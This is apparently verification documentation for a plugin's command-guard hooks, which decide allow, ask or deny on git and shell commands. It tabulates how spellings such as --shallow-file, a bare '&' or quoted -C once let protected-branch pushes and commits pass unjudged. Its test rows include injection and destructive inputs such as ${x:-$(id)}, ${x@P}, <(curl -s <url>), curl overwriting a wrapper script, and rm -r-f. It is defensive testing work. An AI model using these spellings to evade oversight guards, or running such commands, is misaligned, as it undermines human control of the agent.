**`--shallow-file <path>`, the seventh word-taking option, closed after the block above and measured against its own pair.** The six closed above were enumerated from a git that DOCUMENTS its own global options (`git --help`, 2.50.1), and that usage block prints neither `--attr-source` nor `--shallow-file`; the first was caught by hand and the second was not. The same git accepts it: `git --shallow-file /dev/null status --short` exits 0 on 2.50.1. So the walker ate the option, left `/dev/null` sitting where the subcommand should be, and `git -C <repo> --shallow-file /dev/null push <remote> <protected>` was SILENT — a missed refusal in the only deny-capable guard, with the `--attr-source` spelling of the same command denying beside it. The fix adds `--shallow-file` to the same arm and **re-derives the enumeration from git's own `handle_options` rather than from its usage block**, which is what the helper's comment and the guard's header now say. Fixture, payload shape, `<repo>`, `<protected>` and `<feature>` as the block above.

| # | Shape | before | after | What tightened it |
|---|---|---|---|---|
| T34, T35 | `git -C <repo> --shallow-file /dev/null push <remote> <protected>`; the same without the `-C`, the payload's `cwd` naming `<repo>` | SILENT | **deny** | the word-taking arm, extended. The second shows the miss did not need the anchor to come from the option walk |
| T36, T37 | the same with `merge <protected>` and `rebase <protected>` | SILENT | **deny** | the same arm reaching the other two subcommands |
| T38, T39 | HEAD on `<protected>`: `git -C <repo> --shallow-file /dev/null push <remote> <feature>`; the bare `git -C <repo> --shallow-file /dev/null push` | SILENT | **deny** | **condition (b)**, which `--shallow-file` evaded exactly as the six spellings above had. T34–T37 re-driven on that HEAD are `deny` too |

**The pair, and what held.** 14 payloads × 6 guards × 2 HEAD states = **168 decision rows**, driven on §0's primary fixture against this plugin's tree immediately before this fix and immediately after. **14 moved, 154 are identical**: the six rows above, the four condition-(b) re-drives of T34–T37, and two SILENT → `allow` rows with one SILENT → `ask` twin, recorded in §3.3. Five controls hold **deny** in both columns — `git -C <repo> --attr-source HEAD push <remote> <protected>` (the enumerated arm the miss was measured against) and `git -C <repo> push <remote> <protected>`, each on both HEAD states, plus `git -C <repo> push <remote> <feature>` with HEAD on `<protected>`, which is condition (b)'s own live control. Five bound it on the other side and hold **SILENT** in both columns: with HEAD on `<feature>`, `git -C <repo> --shallow-file /dev/null push <remote> <feature>`, the bare `--shallow-file` push and the plain `push <remote> <feature>`; and, in both allow-only guards on both HEAD states, `git -C <repo> --shallow-file /dev/null rm tracked.txt && ls` and `… branch -D x && ls`.

**What §1 owes this change, discharged.** The fork half is exact and unchanged: with §0's `PATH` shim, this guard reproduces `0 jq / 0 git / 0 sed / 0 grep / 0 tr / 1 cat` on `git status && ls` and on the bare `ls`, and `2 jq / 2 git / 1 sed / 0 grep / 1 tr / 1 cat` on `git -C <repo> push <remote> <feature>`, on both trees. The one payload whose cost moves is again the one whose decision moves: `git -C <repo> --shallow-file /dev/null push <remote> <feature>` goes from `1 jq / 1 cat` to that same recognised-push count. §1.2 was re-driven paired, twice, on this guard's four cells: before and after are flat against each other in every cell of both runs, well inside the ±10% tolerance. A new pattern in an existing `case` arm adds no process and no branch that was not already walked.

### 3.3 Widened — SILENT → `allow`

The direction that needs an argument per row rather than a count. The unchanged rows that bound each widening are kept in the same table, because a widening read without them is the thing this section is for.

| # | Shape | baseline | shipped | Why it is acceptable |
|---|---|---|---|---|
| W1, W2 | `git -C "<repo>" status && ls`, single-quoted twin | SILENT | **allow** | the de-quote reaches the directory **whitelist**, not the subcommand: §2.5's 33-subcommand sweep shows quoted and unquoted agree on all 33, and the same one-line call is what lets the deny guard refuse a quoted-`-C` push (§2.5's Q4/Q5/Q15) |
| W3 | `<runner> --prefix "<app_dir>" <configured sub>` | SILENT | **allow** | the sibling de-quote, §2.2's K3. An ordinary spelling of a command the bare form already granted |
| W4–W6 | `git <-c k=v \| --git-dir= \| --work-tree=> -C <repo> <safe sub>` | SILENT | **allow** | new **spellings**, not a new capability: the `-C`-first ordering of each is `allow` on **both** sets (W4b–W6b below), so nothing became reachable that was not. Disclosed, and closing it means refusing any global option but `-C`, which also narrows the pre-existing ordering — its own change with its own matrix |
| W7 | `git -C "<repo>" rm <tracked>` | SILENT | **allow** | the reconstruction `case` enumerating the quoted spellings; the baseline lost the whole compound instead, because it fed the quoted directory to `git rev-parse` verbatim and resolved no repository |
| W4b–W6b | the `-C`-first ordering of W4–W6 | allow | allow | the controls that make W4–W6 spellings rather than capabilities |
| W8, W9 | `git -C <repo> status && rm <tracked> >/<outside>/x`, `2>/dev/null` | allow | allow | **inherited, not introduced.** The trailing-redirect strip and its residual are both the baseline's. §2.4's (d) carries the bound |

**The commit guard's bare-`&` rows, added with §3.1's block and measured against the same pair — this plugin's tree immediately before that fix and immediately after, not the pre-extraction baseline.** Adding the bare `&` to the shared splitter brings a `git … commit` that sits behind one into scope for `git-commit-branch-guard.sh`, which previously read `<anything> & git commit -m x` as a single piece whose command word was not `git` and stayed silent on it. Both directions of that are recorded here rather than split across §3.2, because §3.2 is the deny-capable guard's section and the `ask` rows are the same rows.

| # | Shape | before | after | Why it is acceptable |
|---|---|---|---|---|
| W10–W12 | `rm -r-f <dir> & git commit -m x`, `ls & git -C <repo> commit -m x`, `bash /tmp/<script>.sh & git commit -m x`, `<repo>` on an **ordinary** branch | SILENT | **allow** | the whole point of the guard is to answer the commit it can see, and the allow it emits covers the whole call in **exactly** the way it already did for the `&&` spelling of the same command: `rm -r-f <dir> && git commit -m x` and `bash /tmp/<script>.sh && git commit -m x` are `allow` on **both** trees (WK5, WK6). A new spelling of a pre-existing grant, not a new capability. **Its bound is the direction of the pair:** the identical three shapes with `<repo>` on a **protected** branch move SILENT → `ask` (A10–A12 below), which is the refusal the guard exists for and which the before column did not make at all |
| A10–A12 | the same three shapes with `<repo>` on a **protected** branch | SILENT | **ask** | the tightening half, and the reason the widening is worth its cost: a commit to a protected branch hidden behind a bare `&` was silently unjudged before |
| WK5, WK6 | `rm -r-f <dir> && git commit -m x`, `bash /tmp/<script>.sh && git commit -m x` | allow | allow | the controls for W10–W12: the `&&` spelling of the same rides was already granted, on both trees |
| WK1–WK4 | `git -C <repo> commit -m x`, `git commit -m "a & b"`, `git add . && git commit -m x`, `git commit -m x 2>&1` | allow | allow | the controls: the ordinary spellings, the quoted `&` (whose split fragment still carries the `commit`), and a redirection `&`, which is not a separator |

14 rows driven across the two branch states, 28 decisions per tree; 6 moved, 8 held. The other guard that gained no rows in either direction is `autonomous-protected-branch-guard.sh`, for the reason §3.1's block gives.

**The word-taking global-option rows in this direction, from the same pair as §3.2's T22–T33 block.** Reaching the subcommand past `--git-dir <dir>` and its siblings reaches it for the guards that answer `allow` too, so the one-arm change moves seven rows this way. Each is a new SPELLING of a grant the `=` form already carried, and the `=` control sits beside it.

| # | Shape | before | after | Why it is acceptable |
|---|---|---|---|---|
| W13–W15 | `git -C <repo> <--git-dir <dir> \| --work-tree <dir> \| --namespace <ns>> status && ls`, on an ordinary HEAD and on `<protected>` — six rows | SILENT | **allow** | §3.3's own W4–W6 in the space spelling, judged by the same directory whitelist and the same `hc_safe_prefixes`. The `=` spelling of each is `allow` on **both** trees (WK7), so nothing became reachable that was not |
| W16 | `git --git-dir <repo>/.git commit -m x`, `<repo>` on an **ordinary** branch | SILENT | **allow** | the commit guard answering the commit it can now see, exactly as it already did for `git --git-dir=<repo>/.git commit -m x` (WK8, `allow` on both trees). **Its bound is the direction of the pair**, A13 below |
| A13 | the same shape with HEAD on `<protected>` | SILENT | **ask** | the tightening half, and the reason W16 is worth its cost: a commit to a protected branch hidden behind the space spelling of `--git-dir` was silently unjudged before |
| WK7, WK8 | the `=` spelling of W13–W15 and of W16 / A13 | allow / ask | allow / ask | the controls that make the seven rows spellings rather than capabilities |
| WK9–WK11 | `git -C <repo> --git-dir <dir> rm tracked.txt && ls`, the same with `push <remote> <feature>`, and `git -C <repo> --git-dir <dir> branch -D x && ls` in both allow-only guards | SILENT | SILENT | the bound on the other side: reaching the subcommand hands nothing outside `hc_safe_prefixes` to an allow, and `hc_piece_is_never_safe` still refuses the deletion |

**The `--shallow-file` rows in this direction, from the pair described at the end of §3.2.** The seventh option reaches the subcommand for the allow-answering guards too, in the same two shapes its six siblings did.

| # | Shape | before | after | Why it is acceptable |
|---|---|---|---|---|
| W17 | `git -C <repo> --shallow-file /dev/null status && ls`, on an ordinary HEAD and on `<protected>` — two rows | SILENT | **allow** | W13–W15 in the seventh spelling, judged by the same directory whitelist and the same `hc_safe_prefixes`; `git status && ls` is `allow` on **both** trees (WK12), so nothing became reachable that was not |
| W18 | `git --shallow-file /dev/null commit -m x`, `<repo>` on an **ordinary** branch | SILENT | **allow** | the commit guard answering the commit it can now see, as W16 for `--git-dir`. **Its bound is A14** |
| A14 | the same shape with HEAD on `<protected>` | SILENT | **ask** | the tightening half: a commit to a protected branch hidden behind `--shallow-file` was silently unjudged before |
| WK12 | `git status && ls` in `allow-safe-compounds.sh`, both HEAD states | allow | allow | the control that makes W17 a spelling rather than a capability |
| WK13, WK14 | `git -C <repo> --shallow-file /dev/null rm tracked.txt && ls` and `… branch -D x && ls` in both allow-only guards, both HEAD states | SILENT | SILENT | the bound on the other side, as WK9–WK11: reaching the subcommand hands nothing outside `hc_safe_prefixes` to an allow |

**The construct scan's `${` narrowing, landed with §3.1's N84–N86 and measured against the same pair.** The scan refused every `${`, and that was measured silencing the shipped instruction corpus's own canonical commit invocation — seven autonomous instruction files spell it with `${branch}` in the statistics path and again in the subject. Deleting the arm was measured too and is worse: it releases `${x@P}`, whose bash 4.4+ prompt expansion performs command substitution on a `$(` held **inside the variable's value**, which the `$(` arm cannot see because that `$(` is not in the command string — inert on the bash 3.2 floor, live on the Linux an adopter runs. The arm is therefore narrowed rather than removed: a bare `${IDENT}` is admitted, every other braced form is refused. Ten of the sixty-seven shapes driven move in this direction.

| # | Shape | before | after | Why it is acceptable |
|---|---|---|---|---|
| W19 | the corpus's canonical commit invocation — `bash <S>/commit-on-branch.sh --repo "$REPO_ROOT" "<state dir>/branch_statistics/${branch}/statistics.md" -- "chore: Add branch statistics for ${branch}"`, and its `"${REPO_ROOT}"` spelling — two rows | SILENT | **allow** | the shape the narrowing exists for. It is not a new capability by any reading: the **unbraced** spelling of the identical command, `$branch`, is `allow` on **both** trees (WK17), so before this change the guard's answer to the corpus's own commit path was a function of typography |
| W20 | `bash <S>/<wrapper>.sh ${HOME}` — §3.1's N106 | SILENT | **allow** | the same, on the shape N106 recorded. Its unbraced twin `$HOME` is `allow` on both trees, the same bound as W19 |
| W21 | `… -- "release ${VERSION} of ${PROJECT_NAME}"`; `… -- "${a}${b}"`; `… -- "${_x9}"`; `bash <S>/<wrapper>.sh ${NAME}`; `… --out ${NAME}.sh.bak` — five rows | SILENT | **allow** | the walk over **every** `${` in the string, not just the first, and the identifier class it admits — a leading `_`, a digit after the first character. The last row is an argument that merely *mentions* a script name and is not a `.sh` token |
| WK15 | nine braced spellings that are not `${IDENT}`: `${x@P}`, `${x:-$(id)}`, `${!x}`, `${#x}`, `${x[0]}`, `${x/a/b}`, `${}`, `${1}`, and the unterminated `${unterminated` | SILENT | SILENT | the bound that makes this a narrowing rather than a removal, and `${x@P}` is the row it exists for. `${x:-$(id)}` is refused twice over, by this arm and by the `$(` arm ahead of it |
| WK16 | `bash <S>/${NAME}.sh`; `bash <S>/${D}/x.sh`; `bash <S>/sub/${NAME}.sh`; and the sibling-worktree spelling of the first | SILENT | SILENT | **the interaction, and the reason the two changes are one commit.** Each of these is now admitted by the scan and refused by §3.1's N84–N86 instead. With that rule absent they are `allow` — a construct-scan silence converted into a permit, which is what landing this block alone would have done |
| WK17 | the unbraced twin of W19, `$branch` in the same two positions | allow | allow | the control that makes W19 a spelling rather than a capability, and the measurement behind the typography claim above |

**Which two trees these columns are.** As with §3.1's N84–N86 and for the same reason: this plugin's tree immediately before this fix and immediately after, driven back to back in one session on a `git init` throwaway carrying `scriptsDir: scripts`. **67 shapes per tree, 134 decisions; 10 moved, 57 held.**

**What §1 owes this change, discharged.** The walk is `case` plus builtin parameter expansion plus one `=~`, and it runs only over a string already in the shell. With §0's shim, this guard's counts on §1.3's two published payloads are unchanged — **0 `jq` / 0 `git` / 0 `sed` / 0 `grep` / 0 `tr` / 1 `cat`** on `git status && ls` and on the bare `ls` — and unchanged on an allowed wrapper at **3 / 1 / 0 / 0 / 2 / 1**. The counts do change on a payload the narrowing **releases**, from `1 jq` to `3 jq / 1 git / 2 tr / 1 cat`, and that is not the walk's cost: it is the cost of a command now *reaching* the decision instead of exiting at the scan, which is the whole point of the change.

**The credentials basename anchoring's two rows in this direction, landed with §3.1's N108–N113 and measured against the same pair.** Anchoring `piece_names_creds` to a word's basename stops routing a *lookalike* path to the read-command test, so a piece naming one is judged by `hc_safe_prefixes` like every other piece that names no credentials file. Two of the fifty-nine shapes driven move this way.

| # | Shape | before | after | Why it is acceptable |
|---|---|---|---|---|
| W22 | `cat <creds> && find <creds>.bak -delete`; `cut -d= -f2 <creds> && find <creds>.bak -delete` — two rows | SILENT | **allow** | the guard never defended lookalikes as policy — it defended them **incidentally**, through the same over-match that granted §3.1's N110, a read of an arbitrary absolute path under the configured file's reason string. The bound is WK18: the identical shape naming a path the configured basename is not a substring of was `allow` on **both** trees, so what changed is which paths count as ordinary, not what an ordinary path may do. The first row is `allow` from `allow-safe-compounds.sh` on both trees as well (every piece is a safe prefix); the second is not, which is why both are recorded rather than only the one with a sibling grant |
| WK18 | `cat <creds> && find /tmp/x -delete` | allow | allow | the control that makes W22 a reclassification rather than a capability |
| WK19 | `find <creds>.bak -delete` on its own | SILENT | SILENT | the other half of the bound: a lookalike piece sets `found_creds` nowhere, so it cannot carry an allow by itself — it rides only where a real read of the configured file already did |
| WK20 | `find <creds> -delete` | SILENT | SILENT | the refusal the piece test exists for, on the configured file itself, untouched |

**Which two trees these columns are.** As with §3.1's N108–N113: this plugin's tree immediately before that fix and immediately after, driven back to back in one session on §0's primary fixture.

**The construct scan's `>` narrowing, landed with §3.1's N100–N102 and N107 supersessions and measured against the same kind of pair the commit guard's bare-`&` block above is — this plugin's tree immediately before **this** change and immediately after, not the pre-extraction baseline §3's caveat says cannot be re-taken here.** The scan refused every `>`, and that was measured silencing `bash <S>/<wrapper>.sh 2>&1` — the flow's own route around a missing permission entry, refused for three different agents on one adoption — along with `> /dev/null`, `2>/dev/null` and the corpus's `commit-on-branch.sh … 2>&1`. The arm is narrowed rather than removed, exactly as `${` was: at each `>` the walk admits a **descriptor duplication** (`>&<digits>`, `>&-`) and a one- or two-`>` redirection to the literal **`/dev/null`**, and refuses every other destination. **The acceptability argument is one sentence and it is the same for every moved row**, so it is stated in each row in its short form: neither admitted shape names a file or opens one, so neither can reach a second command — which is what the `$(`, backtick, `|` and `<` arms are for, and what `>(` still is. **The command strings below are paired with the guard's own REPRO block** so the two cannot drift, and the pairing is stated here rather than per row: every string in the two moved rows is copied from that block's ALLOW list, and every control is one of its NO-OUTPUT or STILL-ALLOW entries — with a `<path>` destination spelled as a concrete path, and with WK26 and WK27 composing such an entry with an admitted redirection the same block lists on its own line.

| # | Shape | before | after | Why it is acceptable |
|---|---|---|---|---|
| W23 | the four forms the finding measured — `bash <S>/<wrapper>.sh 2>&1`; `… > /dev/null`; `… 2>/dev/null`; `bash <S>/commit-on-branch.sh --repo . -m "x" 2>&1` — four rows | SILENT | **allow** | **the destination reaches no file.** A descriptor duplication points one already-open descriptor at another and opens nothing; `/dev/null` is a fixed character device that discards every byte and is the same file for every adopter. So neither can reach a second command, which is the whole of the union argument the other four arms rest on, and neither can reach a file, which is WK23. Not a new capability by any reading: the identical invocation without the redirection is `allow` on **both** trees (WK28), so before this change the guard's answer to the flow's own route around a missing permission entry was a function of where the output went |
| W24 | the spellings the same walk admits beside those four — `… >>/dev/null`; `… &>/dev/null`; `… >&2`; `… 2>&-` — four rows | SILENT | **allow** | the same argument in the same two shapes: `>>/dev/null` and `&>/dev/null` are the `/dev/null` destination at a two-`>` run and behind a leading `&`, `>&2` and `2>&-` are descriptor duplications. The leading `2` / `&` needs no test of its own because the walk keys on what **follows** the `>` run; WK24 is the pair of rows showing the run length and the terminator are read rather than assumed |
| WK21 | `bash <S>/<wrapper>.sh \| tail -5` | SILENT | SILENT | the pipe is deliberately untouched — `\|` is still a whole-string `case` arm, and a tail that runs a second command is refused exactly as §2.4's j1–j2 record |
| WK22 | `… >(cat)`; `… <(curl -s <url>)` — two rows | SILENT | SILENT | process substitution in both directions, §3.1's N98–N99: a `(` after the `>` run is refused by the walk, and `<(` never reaches it. This is the row the union argument would fail on |
| WK23 | a FILE destination — `… > <repo>/<S>/other.sh`; `… >> <repo>/out.txt`; `… > /tmp/x`; `… >> /tmp/x` — four rows | SILENT | SILENT | the class the narrowing refuses **on purpose**: the first overwrites a wrapper while every path in it is impeccable, which the leading-words test cannot see because a `>` operand is not in command position. The last two are §3.1's N100 and N101, which is why those two are not superseded and N102 is |
| WK24 | `… > /dev/nullx`; `… >>> /dev/null` — two rows | SILENT | SILENT | the terminator test and the run-length test: `/dev/null` is admitted only when a blank or the end of the string follows it, and a run of three or more `>` is refused before any destination is read |
| WK25 | `rm -r-f <repo>/<S>/<wrapper>.sh`; `curl -o <repo>/<S>/<wrapper>.sh <url>` — two rows | SILENT | SILENT | the finding's own named destructive pair — it spells the first `rm -rf`, driven here in §0's benign stand-in, the spelling §3.1's N27 also carries. Refused by the leading-words test independently of any scan, so the walk neither reaches them nor needs to |
| WK26 | `bash <S>/deploy.sh 2>&1` | SILENT | SILENT | an admitted redirect does not launder a denied basename: the deny list is judged on the piece, as §2.4's j7 already bounded it for the pipe |
| WK27 | `bash <S>/<wrapper>.sh > /dev/null && rm -r-f <repo>/<tracked>` | SILENT | SILENT | admitting the redirect returns the command to the split, it does not vouch for it — §3.1's N24 with an admitted redirection in front of it |
| WK28 | `bash <S>/<wrapper>.sh`; `… && git status` — two rows | allow | allow | the controls that make W23–W24 spellings rather than capabilities, and the guard live in both columns |
| WK29 | `… < /tmp/x`; `… <<< hello`; `bash <S>/a.sh \|\| bash <S>/b.sh` — three rows | SILENT | SILENT | the `<` arm and the `\|\|` cost, both untouched — §3.1's N103, N104 and N107's own subject, and the reason N107 is superseded only in its trailing clause |

**26 shapes per tree, 52 decisions; 8 moved, 18 held** (2 `allow`, 16 SILENT). Fixture: a throwaway repository under the system temp directory carrying `examples/harness.config.json` verbatim — §0's primary configuration, so `<S>` is `packages/storefront/scripts` — plus the wrappers the rows name and one tracked file, driven with §0's payload form. The **before** column is not assumed: the guard as it stood immediately before the change was written into that same temp directory beside a copy of `lib/harness-config-lib.sh` that `diff` reports byte-identical to the shipped one, so the guard file is the only difference between the two columns. Two runs of the driver are identical and the fixture configuration was byte-identical to its pristine copy afterwards.

**What this block does not contradict, checked rather than assumed.** Every command string quoted above was grepped against the rest of this file. `W8`/`W9` above are a **different guard** — `git-rewrite-branch-guard.sh`'s trailing-redirect strip and §2.4's residual (d) — and are untouched here; §2.1's redirect rows and §3.1's N38 are the rewrite and credentials guards for the same reason. The one set of pre-existing rows that names this guard with a redirection is the bare-`&` block's keeper list (`bash <S>/typecheck.sh 2>&1`, `&> <log>`, `>&2 && git status`, `allow` in both columns); those columns are the **pre-construct-scan** pair, so they are a point-in-time record rather than a claim about the shipped tree, and this block is what says which of them hold in it — the first and third do, the `&> <log>` spelling does not, because a log file is WK23's class. All three were **driven** in the same session, three further shapes per tree beyond the table's 26.

**What §1 owes this change, discharged for the fork half, disclosed for the other.** With §0's `PATH` shim this guard reproduces §1.3's published counts on both of that table's payloads — **0 `jq` / 0 `git` / 0 `sed` / 0 `grep` / 0 `tr` / 1 `cat`** on `git status && ls` and on the bare `ls` — and **3 / 1 / 0 / 0 / 2 / 1** on an allowed wrapper, every cell identical on the two trees: the walk is `case` plus builtin parameter expansion and forks nothing. The counts move on exactly one payload, and it is one whose decision moves — `bash <S>/<wrapper>.sh 2>&1` goes from `1 jq / 1 cat` to that same allowed-wrapper count, which is the cost of a command now *reaching* the decision instead of exiting at the scan — while a payload the walk still refuses (`… > <repo>/out.txt`) stays at `1 jq / 1 cat`. §1.2 was **not** re-driven, and stays stamped where §1.1's standing note leaves it.

**The compound guard's single-statement `git -C` admission, measured against the same kind of pair as the block above — this plugin's tree at `main` and the tree carrying **this** change, not the pre-extraction baseline.** `allow-safe-compounds.sh` exited at its own prefilters unless the command carried `&&`, `||`, `;` or a newline, so a `git -C <dir> <subcommand>` on its own was judged by nothing here — and by nothing in the generated profile either, whose thirteen `git <verb>` entries are prefix matches anchored at the START of the command string that the directory sitting between `git` and the verb defeats. The prefilter now admits that one further shape and no other: `hc_git_piece_parts` must find a global `-C`, and the statement then goes through the **same** piece loop a compound's pieces go through. **The acceptability argument is one sentence and it is the same for every moved row**, so each row states it in short form: the rewrite helper and the prefix set are unchanged, so the **subcommand** is judged against exactly the set its bare spelling is judged against and only the route in is new — §2.5's 33-subcommand sweep is the standing evidence for what that set grants and what it withholds. **The command strings below are paired with the guard's own REPRO block** so the two cannot drift, and the pairing is stated here rather than per row: every string in the two moved rows is one of that block's ALLOW entries or one of the quoted spellings that block folds into them, and WK30, WK31's `push --all`, WK32's relative and `..` spellings and WK33 are its NO-OUTPUT entries. Four controls are **not** in it and are added here beside them — WK31's `reset --hard`, `checkout` and `clean -fd`, which the block covers by class rather than by line, and WK32's `${x}` spelling, which its character-class entry covers the same way. `<repo>`, `<work_root>/<project_name>-<branch>`, `<b>` and `<remote>` are the fixture's concrete paths and names.

| # | Shape | before | after | Why it is acceptable |
|---|---|---|---|---|
| W25 | the two commands the finding measured — `git -C <repo> rev-parse --show-toplevel`; `git -C <repo> status --short` — two rows | SILENT | **allow** | **the route is new, the judgement is not.** `hc_git_piece_in_workspace` rewrites the statement to `git rev-parse --show-toplevel` / `git status --short` and `hc_safe_prefixes` answers that — the same helper and the same set the identical piece already gets inside a compound, which is §2.5's Q11. Not a new capability by any reading: the directory-free spelling of each is granted by the profile's own verb prefixes with no guard involved, so before this change the guard's answer to the form the harness's own generated worktree script writes was a function of where the directory sat |
| W26 | the same two written six other ways — `git -C "<repo>" rev-parse --show-toplevel`; `git -C "<repo>" status --short`; `git -C '<repo>' status --short`; `git -C <work_root>/<project_name>-<branch> rev-parse --show-toplevel`; `… status --short`; `git -C "<work_root>/<project_name>-<branch>" status --short` — six rows | SILENT | **allow** | **spellings of W25, not capabilities.** `hc_strip_quotes` peels either pair before the whitelist sees the directory — §2.5's Q1/Q2 are that same de-quote inside a compound and §3.3's W1/W2 are its own widening row — and a sibling worktree's directory is its own anchor, so it resolves to itself and is admitted by `hc_in_workspace`'s **root** arm rather than by the `<work_root>/<project_name>-*` glob. That glob is what covers a worktree directory some *other* piece anchored, which only a compound can do, so this change does not reach it |
| WK30 | the deny floor behind a `-C`, on its own — `git -C <repo> branch -D <b>`; `… branch -d <b>`; `… branch -M a b`; `… branch -m a b`; `… branch -q -D <b>` — five rows | SILENT | SILENT | **the load-bearing rows of this block.** A hook `allow` short-circuits the permission system, and a profile `deny` is anchored at the start of the command string, so `Bash(git branch -D:*)` never fires on this shape — `hc_piece_is_never_safe` is the whole floor here, and the admission test hands the statement to it before any prefix is matched. Any one of these printing an `allow` is a defect, not a row |
| WK31 | a safe directory, an unsafe subcommand — `git -C <repo> push --all <remote>`; `… reset --hard`; `… checkout <b>`; `… clean -fd` — four rows | SILENT | SILENT | the whitelist admits the directory and `hc_safe_prefixes` withholds, which is §2.5's Q3 on a single statement. All four are subcommands §2.5's sweep already drove to silence in the compound form, and all four are in the generated profile's `ask` in their directory-free spelling |
| WK32 | a directory the whitelist refuses — `git -C sub status --short`, relative; `git -C <repo>/../evil status --short`; `git -C ${HOME}/x status --short`, unexpanded — three rows | SILENT | SILENT | the directory tests the admission test does not replace: `hc_git_piece_in_workspace`'s absolute-path arm, its `/../` arm and its `[A-Za-z0-9._/-]` character class, each refusing here exactly what it refuses inside a compound |
| WK33 | `git status --short` — a single statement carrying no `-C` | SILENT | SILENT | **the prefilter was widened by one shape rather than removed.** This statement never reaches the piece loop, so the profile's own verb prefixes still answer it and this guard grants nothing. Widening to every single statement would extend the compound set's reach to every bare command an adopter configures in `commands.*` |
| WK34 | `git status && ls` | allow | allow | the control: the guard was live in both columns, and the compound path it was already handed is untouched by the admission test |
| WK35 | the three single statements this file already carries as rows elsewhere — §2.4's s4 (`git status \| bash`) and §2.5's Q9 and Q10 anchor controls — three rows | SILENT | SILENT | re-driven because the admission test is the leg they turn on: s4 carries no `-C` and stops at WK33's arm, while Q9 and Q10 carry one whose directory will not resolve, so neither becomes an anchor and the guard exits at repository resolution. All three hold their published decision |

**25 shapes per tree, 50 decisions; 8 moved, 17 held** (1 `allow`, 16 SILENT). Fixture: a `git init` throwaway under the system temp directory carrying `examples/harness.config.json` verbatim — §0's primary configuration, so `<project_name>` is `acme-shop` — with one tracked file, HEAD on `feat_probe`, and one real sibling worktree added at `<work_root>/acme-shop-<branch>`, driven with §0's payload form. **Take the fixture path through `pwd -P`**: macOS's `/var` is a symlink to `/private/var`, `rev-parse --show-toplevel` answers the resolved form and `hc_in_workspace` compares textually, so an unresolved fixture path makes every row of this block SILENT for a reason that has nothing to do with the change — it did, on the first run of this driver. The **before** column is not assumed: the guard as it stands at `main` was written into that same temp directory beside a copy of `lib/harness-config-lib.sh` that `diff` reports byte-identical to the shipped one, so the guard file is the only difference between the two columns. Two runs of the driver are identical and the fixture configuration was byte-identical to its pristine copy afterwards.

**What this block does not discharge.** Finding 17 owes two verifications and these rows are the second of them. The first — *"a run whose `.stream.jsonl` carries **zero** `permission_denied` events naming a `git -C` command"* — is an observation about a live adoption run, and this branch runs no adoption, so it cannot be made here. The substitute made instead is the narrowest one in reach and it is W25: the two exact commands the finding recorded as refused are **driven** against the shipped guard and answer `allow`. Item (1) stays **owed**, as an adoption-run observation, and is not claimed by any row above.

**What §1 owes this change, discharged for the fork half.** With §0's `PATH` shim this guard reproduces §1.3's published counts on both of that table's payloads — **3 `jq` / 1 `git` / 0 `sed` / 0 `grep` / 0 `tr` / 3 `cat`** on `git status && ls`, and **0 / 0 / 0 / 0 / 0 / 1** on the bare `ls` — every cell identical on the two trees: the added prefilter arm is a `case` and the admission test is a clean plus one call to a parser, neither of which runs an external command. The counts move on exactly one payload, and it is one whose decision moves — `git -C <repo> status --short` goes from `0 / 0 / 0 / 0 / 0 / 1` to the two-piece compound's own `3 / 1 / 0 / 0 / 0 / 3`, which is the cost of a command now *reaching* the decision instead of exiting at the prefilter. §1.2 was **not** re-driven, and stays stamped where §1.1's standing note leaves it.

**The `hc_clean_piece` in the admission test is a later fix, and its cost half is read rather than driven.** The admission test originally handed the walker the raw command, which matches an exact `git ` prefix, so a blank-padded or grouped spelling of the very shape W25 is about fell through while the identical piece inside a compound was judged; cleaning first removes that divergence. It adds one `$(…)` subshell over builtin parameter expansion — no external command — on the single-statement path only, the path that forks for `hc_resolve_repo_root` on the next line, so neither of §1.3's published payloads can reach it: `git status && ls` leaves the admission test by its `&&` arm and the bare `ls` exits at the byte prefilter. That is read from the code; this round could not stand up §0's fixture, so the two spellings the clean admits carry **no driven row** and none is claimed in the table above. They are recorded in the guard's own REPRO block instead.

Two configured-command rows belong to this direction and are in the `J` block instead, because their cause is the configuration rather than a matcher.

### 3.4 Unchanged but re-implemented

Two changes were refactors with no intended decision change. Asserting that is what §2.1 and §2.2 exist to stop, so both were driven rather than reasoned: the regression set this file's sections are built from — the fail-closed conditions the driver carries, every expansion-bypass row, every quoted-`-C` row and both allow-only guards' own REPRO rows, **139 decision rows** under 20 headings — was run against the tree immediately before each change and the tree immediately after, in the same session, on §0's primary fixture.

**What "the fail-closed conditions the driver carries" is, exactly**, because §3.4's own point is that coverage must be driven rather than claimed: nine of §2.3's fourteen condition rows and two of its single-guard gates. Not in it are the multi-document row, the pre-1.5 `jq` row, the unreadable-configuration row, the second (permittable-bytes) payload row and the re-taken control. Two of those five are the conditions the configuration cache introduced, and their decision identity is carried over the full 108 cells by §2.3's own cache paragraph rather than by this pair of runs. The other three are a real gap in these two pairs, named here rather than argued away: a refactor that moved one of them would not have been caught by these runs. A reader who needs all fourteen conditions against these two trees has to extend the driver and re-take both pairs.

| Refactor | rows run | rows that moved |
|---|---|---|
| the path-anchored-pattern block lifted out of both guards into the shared library | 139 × 2 | **0** |
| the backtick count in `hc_torn_substitution` moved from a `grep -o \| wc -l` pipeline to pure parameter expansion | 139 × 2 | **0** |

Each pre-change run carries denies, asks and allows as well as silences, so the sets were live in both columns of both pairs; an all-silent run would have proved nothing. The configuration-cache refactor's decision identity is the same evidence taken a third time, and lives in §2.1 and §2.3's own paragraphs rather than being repeated here.

### 3.5 Jurisdiction and defaults

The port changed **what the guards read** as well as what they decide, and for an adopter whose repository differs from the baseline's one that is the larger change of the two. It is where this section's only refusal-losing conditions live — one of which, J1c, loses the refusal to an explicit `allow` rather than to silence; §3.6 adds the second spelling of the jurisdiction one.

| # | Condition | baseline | shipped | Reading |
|---|---|---|---|---|
| J1 | `git -C <repo> push <remote> <a branch the baseline baked in>` | **deny** | SILENT | **no branch name is baked in.** `hc_protected_patterns` (`plugin/hooks/lib/harness-config-lib.sh`) carries the schema default `main` as its only executable literal; every other name is the adopter's. List the name and the refusal returns — measured, four of four, in §3.7's `G` rows |
| J1b | a bare `push` / `merge` / `rebase`, and the symbolic `HEAD` / `@` target, with **HEAD on** such a branch | **deny** | SILENT | the same cause reaching the deny guard's **HEAD arm** rather than its target arm. Six spellings, restored six of six by listing the name — §3.7's `I` rows. J1's own rows cannot reach this arm: they are driven from a HEAD both sets protect |
| J1c | `git -C <repo> commit -m x`, HEAD on such a branch | **ask** | **`allow`** | the same cause in the commit guard, and **the one row in this section where a baseline refusal becomes a permit rather than silence.** The two are not the same cost: a silent guard hands the command back to the adopter's permission profile, an `allow` suppresses that profile's prompt. Listing the name restores the `ask` — §3.7's `I` rows |
